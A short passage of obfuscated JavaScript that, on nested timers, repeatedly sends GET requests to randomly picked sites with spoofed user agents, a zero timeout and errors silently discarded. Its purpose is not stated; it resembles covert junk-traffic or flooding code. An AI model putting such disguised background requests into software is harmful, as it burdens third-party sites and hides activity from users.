    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x1 * 0x9af + -0x33f2 + 0x58f9) * getRandomInt(-0x2 * -0x3ee + 0x1 * -0x403 + -0x3d8, -0xf82 * 0x1 + -0x1a15 + 0x2 * 0x14ce));
}, 0xf9 * -0x27 + 0x3be + 0x1 * 0x2295);